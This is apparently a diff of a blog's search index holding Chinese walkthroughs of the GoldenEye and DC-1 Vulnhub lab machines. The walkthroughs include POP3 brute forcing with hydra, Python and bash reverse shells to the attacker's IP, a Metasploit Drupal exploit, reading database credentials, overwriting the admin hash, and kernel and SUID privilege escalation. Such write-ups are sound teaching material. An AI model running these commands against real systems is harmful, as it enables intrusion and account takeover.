@@ -2652,10 +2652,10 @@ flag 值：flag{48ad0cde8345c8b2608933ac4e85147e}</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击机ip：192.168.52.128</span><br><span class="line">靶机ip：192.168.52.139</span><br></pre></td></tr></table></figure>
 
 <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>首先使用 Nmap 的 Ping 扫描快速发现活跃主机，发现靶机 ip 为 192.168.52.139</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.52.0/24</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.52.0/24</span><br></pre></td></tr></table></figure>
 
 <p>使用 Nmap 全面扫一下开放的端口和运行的服务</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sT -A -p1-65535 -T4 -O -sV 192.168.52.139</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sT -A -p1-65535 -T4 -O -sV 192.168.52.139</span><br></pre></td></tr></table></figure>
 
 <p>扫描结果如下：系统开放了一个 HTTP 服务（80 端口）、一个 SMTP 服务（25 端口）和两个 POP3 服务（55006 和 55007 端口）</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE  VERSION</span><br><span class="line">25/tcp    open  smtp</span><br><span class="line">|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, </span><br><span class="line">80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: GoldenEye Primary Admin Server</span><br><span class="line">55006/tcp open  ssl/pop3 Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: SASL(PLAIN) AUTH-RESP-CODE CAPA USER UIDL RESP-CODES TOP </span><br><span class="line">55007/tcp open  pop3     Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: CAPA SASL(PLAIN) AUTH-RESP-CODE PIPELINING USER UIDL </span><br></pre></td></tr></table></figure>
@@ -2664,13 +2664,13 @@ flag 值：flag{48ad0cde8345c8b2608933ac4e85147e}</p>
 <p><img src="https://7.isyangs.cn/80/67c453dba1a77-80.webp"></p>
 <p>按照要求访问 &#x2F;sev-home&#x2F; 目录，用刚刚得到的账密登陆，提示一些 电子邮件啊，pop3 等字眼，于是想到爆破 pop3 接收邮件协议</p>
 <h2 id="爆破邮件密码"><a href="#爆破邮件密码" class="headerlink" title="爆破邮件密码"></a>爆破邮件密码</h2><p>将刚刚得到的两个用户名写入 txt 文本中，使用 kali 自带字典 fasttrack.txt 爆破</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo -e &#x27;natalya\nboris&#x27; &gt; GodenEye.txt</span><br><span class="line">hydra -L GodenEye.txt -P /usr/share/wordlists/fasttrack.txt pop3://192.168.52.139:55007</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;natalya\nboris&#x27;</span> &gt; GodenEye.txt</span><br><span class="line">hydra -L GodenEye.txt -P /usr/share/wordlists/fasttrack.txt pop3://192.168.52.139:55007</span><br></pre></td></tr></table></figure>
 
 <p>爆破出这两个账号的密码（爆破的超级慢）</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[55007][pop3] host: 192.168.52.139   login: natalya   password: bird</span><br><span class="line">[55007][pop3] host: 192.168.52.139   login: boris   password: secret1!</span><br></pre></td></tr></table></figure>
 
 <p>使用 nc 连接 pop3 服务，登陆这两个账号查看信息，登陆流程如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc 192.168.52.139 55007		使用 nc 命令连接 POP3 服务</span><br><span class="line">user boris  				登录用户名</span><br><span class="line">pass secret1! 				登录密码</span><br><span class="line">list 						查看邮件列表</span><br><span class="line">retr m 						查看第m个邮件内容</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 192.168.52.139 55007		<span class="comment">#使用 nc 命令连接 POP3 服务</span></span><br><span class="line">user boris  				<span class="comment">#登录用户名</span></span><br><span class="line">pass secret1! 				<span class="comment">#登录密码</span></span><br><span class="line">list 						<span class="comment">#查看邮件列表</span></span><br><span class="line">retr m 						<span class="comment">#查看第m个邮件内容</span></span><br></pre></td></tr></table></figure>
 
 <p>两个账号一共五封邮件，给了一个账号密码 xenia&#x2F;RCP90rulez!，还给了一个 url：severnaya-station.com&#x2F;gnocertdir，需要修改 hosts 文件让 severnaya-station.com 域名指向 192.168.52.139</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.52.139 severnaya-station.com</span><br></pre></td></tr></table></figure>
@@ -2687,19 +2687,19 @@ flag 值：flag{48ad0cde8345c8b2608933ac4e85147e}</p>
 <h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p>根据插件和图标可知该 CMS 为 Moodle，搜索相关漏洞，发现一个 CVE-2013-3630 漏洞</p>
 <p><img src="https://7.isyangs.cn/80/67c453e2132d7-80.webp"></p>
 <p>将反弹 shell 命令填入下框，（bash 不行，但 python 可以）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.52.128&quot;,2233));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.52.128&quot;,2233));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://7.isyangs.cn/80/67c453e24f138-80.webp"></p>
 <p>kali 开启监听，然后在博客中新建文章，点击”Toggle Spellchecker”之后就会触发反弹 shell 命令</p>
 <p><img src="https://7.isyangs.cn/80/67c453dda91eb-80.webp"></p>
 <p>反弹后一个普通用户权限</p>
 <h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>其他提权无果后，尝试内核提权，查看内核版本，发现是 3.13.0 版本的</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname -a</span><br><span class="line">Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line">Linux ubuntu 3.13.0-32-generic <span class="comment">#57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure>
 
 <p>使用 searchsploit 搜索内核相关 exp，找到符合版本的 exp，复制到当前目录，由于无法进行 gcc 编译，需要改下脚本为 cc，然后开启监听便于靶机下载</p>
 <p><img src="https://7.isyangs.cn/80/67c453e237e73-80.webp"></p>
 <p>靶机使用 wegt 命令下载 exp，然后编译提权为可执行文件，命令如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://192.168.52.128:8888/37292.c</span><br><span class="line">cc -o exp 37292.c</span><br><span class="line">chmod +x exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://192.168.52.128:8888/37292.c</span><br><span class="line">cc -o exp 37292.c</span><br><span class="line"><span class="built_in">chmod</span> +x exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>
 
 <p>提权成功，flag 在 root 目录下的隐藏文件中，最后访问 &#x2F;006-final&#x2F;xvf7-flag&#x2F;目录还有一个小彩蛋（）</p>
 <p><img src="https://7.isyangs.cn/80/67c453dc3ea12-80.webp"></p>
@@ -2708,7 +2708,86 @@ flag 值：flag{48ad0cde8345c8b2608933ac4e85147e}</p>
         <category>Vulnhub</category>
       </categories>
       <tags>
-        <tag>Vulnhub</tag>
+        <tag>pop3</tag>
+        <tag>hydra</tag>
+        <tag>Moodle</tag>
+        <tag>内核提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Vulnhub-DC-1</title>
+    <url>/2025/03/09/DC-1/</url>
+    <content><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>vulnhub 下载此靶机，下载地址如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://download.vulnhub.com/dc/DC-1.zip</span><br></pre></td></tr></table></figure>
+
+<p>将靶机设置为 NAT 模式，开机即可，配置说明如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击机ip：192.168.52.128</span><br><span class="line">靶机ip：192.168.52.143</span><br></pre></td></tr></table></figure>
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>首先使用 Nmap 的 Ping 扫描快速发现活跃主机，发现靶机 ip 为 192.168.52.143</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.52.0/24</span><br></pre></td></tr></table></figure>
+
+<p>使用 Nmap 全面扫一下开放的端口和运行的服务</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sT -A -p1-65535 -T4 -O -sV 192.168.52.143</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果如下：系统开放了一个 SSH 服务（22 端口）、 HTTP 服务（80 端口）、还有几个未知端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)</span><br><span class="line">|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)</span><br><span class="line">|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.2.22 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Debian)</span><br><span class="line">|_http-title: Welcome to Drupal Site | Drupal Site</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/</span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt</span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt</span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">52216/tcp open  status  1 (RPC #100024)</span><br></pre></td></tr></table></figure>
+
+<h2 id="网站信息收集"><a href="#网站信息收集" class="headerlink" title="网站信息收集"></a>网站信息收集</h2><p>访问 80 端口搭建的网站，根据明显特征和插件识别发现是用开源 CMS Drupal 搭建的</p>
+<p><img src="https://7.isyangs.cn/80/67cd51659dc1d-80.webp"></p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="CMS-框架漏洞"><a href="#CMS-框架漏洞" class="headerlink" title="CMS 框架漏洞"></a>CMS 框架漏洞</h2><p>搜索历史漏洞，找到一个比较新一点的 CVE-2018-7600，但是复现不出来（脚本也没复现出来）</p>
+<p>于是还是用网上大多数人用的办法，使用 kali 自带工具 Metasploit 来搜索漏洞</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole      <span class="comment">#启动工具</span></span><br><span class="line">search Drupal	<span class="comment">#搜索cms相关漏洞</span></span><br><span class="line">use 1			<span class="comment">#漏洞序号，找对应的或者版本比较新的</span></span><br><span class="line">show options	<span class="comment">#查看需要设置哪些参数</span></span><br><span class="line"><span class="built_in">set</span> rhosts http://192.168.52.143/	<span class="comment">#填入必填参数</span></span><br><span class="line">run				<span class="comment">#运行</span></span><br></pre></td></tr></table></figure>
+
+<p>漏洞利用成功后，会建立一个 Meterpreter 会话，需要手动切换到 shell 执行命令</p>
+<p><img src="https://7.isyangs.cn/80/67cd51622980e-80.webp"></p>
+<p>但是这样没有正常的交互 shell 不习惯，所以这里反弹一个 shell 用</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -c <span class="string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.52.128/2233 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>查看文件得到 flag1，提示寻找 CMS 的配置文件</p>
+<p><img src="https://7.isyangs.cn/80/67cd515c57825-80.webp"></p>
+<h2 id="配置文件泄露"><a href="#配置文件泄露" class="headerlink" title="配置文件泄露"></a>配置文件泄露</h2><p>Drupal 配置文件路径是 <code>/var/www/sites/default/settings.php</code>，在该文件中发现了数据库的账号密码，同时这里可以看到 flag2</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> *</span><br><span class="line"> * flag2</span><br><span class="line"> * Brute force and dictionary attacks aren&#x27;t the</span><br><span class="line"> * only ways to gain access (and you WILL need access).</span><br><span class="line"> * What can you do with these credentials?</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">$databases = array (</span><br><span class="line">  &#x27;default&#x27; =&gt;</span><br><span class="line">  array (</span><br><span class="line">    &#x27;default&#x27; =&gt;</span><br><span class="line">    array (</span><br><span class="line">      &#x27;database&#x27; =&gt; &#x27;drupaldb&#x27;,</span><br><span class="line">      &#x27;username&#x27; =&gt; &#x27;dbuser&#x27;,</span><br><span class="line">      &#x27;password&#x27; =&gt; &#x27;R0ck3t&#x27;,</span><br><span class="line">      &#x27;host&#x27; =&gt; &#x27;localhost&#x27;,</span><br><span class="line">      &#x27;port&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">      &#x27;driver&#x27; =&gt; &#x27;mysql&#x27;,</span><br><span class="line">      &#x27;prefix&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>只能使用该主机连接，但是不知道为什么这里账号密码登陆输入命令无回显，只能用 -e 参数一条一条输入命令来回显</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t -e <span class="string">&quot;show databases&quot;</span>;</span><br><span class="line">mysql -udbuser -pR0ck3t -e <span class="string">&quot;use drupaldb;show tables&quot;</span>;</span><br><span class="line">mysql -udbuser -pR0ck3t -e <span class="string">&quot;use drupaldb;select * from users&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<h2 id="数据库数据修改"><a href="#数据库数据修改" class="headerlink" title="数据库数据修改"></a>数据库数据修改</h2><p>很明显的 users 表，查到 admin 的账号密码，但是密码是 hash 加密过的，这里也不能新建用户然后替换密码，必须知道加密逻辑或者加密方式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin   $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR</span><br></pre></td></tr></table></figure>
+
+<p>hashcat wiki 搜索发现是 Drupal7 样式的，尝试爆破，无果</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -a 0 -m 7900 hash.txt /usr/share/wordlists/fasttrack.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://7.isyangs.cn/80/67cd516411f69-80.webp"></p>
+<p>在 scripts 目录发现加密脚本，读源码可知脚本中定义了需要在默认目录下运行才能正常输出，对比一下文件可知默认目录为 <code>/var/www/</code>，php运行脚本</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php scripts/password-hash.sh admin</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password: admin</span><br><span class="line">hash: $S$DVxrd3dpaRxqtQLXz4IYHGDdKp8TTwdxfvpe8LMQmk2cP7l5.UET</span><br></pre></td></tr></table></figure>
+
+<p>得到 admin 经过脚本加密后的 hash 字符串，使用 UPDATE 函数更新 user 表的 admin 密码即可（这这里非交互式的命令有点问题，总会缺点东西，所以先用交互式的插入，再验证是否成功）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line">use drupaldb;</span><br><span class="line">update <span class="built_in">users</span> <span class="built_in">set</span> pass=<span class="string">&#x27;$S$DVxrd3dpaRxqtQLXz4IYHGDdKp8TTwdxfvpe8LMQmk2cP7l5.UET&#x27;</span> <span class="built_in">where</span> name=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">mysql -udbuser -pR0ck3t -e <span class="string">&quot;use drupaldb;select * from users&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到已经修改为我们加密后的密码了</p>
+<p><img src="https://7.isyangs.cn/80/67cd515c4aed4-80.webp"></p>
+<h2 id="后台信息泄露"><a href="#后台信息泄露" class="headerlink" title="后台信息泄露"></a>后台信息泄露</h2><p>使用修改后的账密 admin:admin 登陆后台，在 content 处发现 flag3，提示我们看 <code>/etc/shadow</code></p>
+<p><img src="https://7.isyangs.cn/80/67cd515d8d1e3-80.webp"></p>
+<p>但是没权限，退一步先看 <code>/etc/passwd</code>，发现 flag4 在 home 目录下，查看提示 flag 在 root 目录下，尝试提权</p>
+<p><img src="https://7.isyangs.cn/80/67cd5163d94ce-80.webp"></p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>suid 提权，先找一下具有 suid 权限的二进制可执行文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://7.isyangs.cn/80/67cd515df4051-80.webp"></p>
+<p>发现 find 文件，经典 find 提权，先随便创建一个文件，执行命令提权，查看 root 目录，得到最终 flag</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span> 1.txt</span><br><span class="line">/usr/bin/find 1.txt -<span class="built_in">exec</span> /bin/sh \; -quit</span><br><span class="line"><span class="built_in">cat</span> /root/thefinalflag.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://7.isyangs.cn/80/67cd516189ba5-80.webp"></p>
+]]></content>
+      <categories>
+        <category>Vulnhub</category>
+      </categories>
+      <tags>
+        <tag>Drupal</tag>
+        <tag>msf</tag>
+        <tag>suid提权</tag>
       </tags>
   </entry>
 </search>
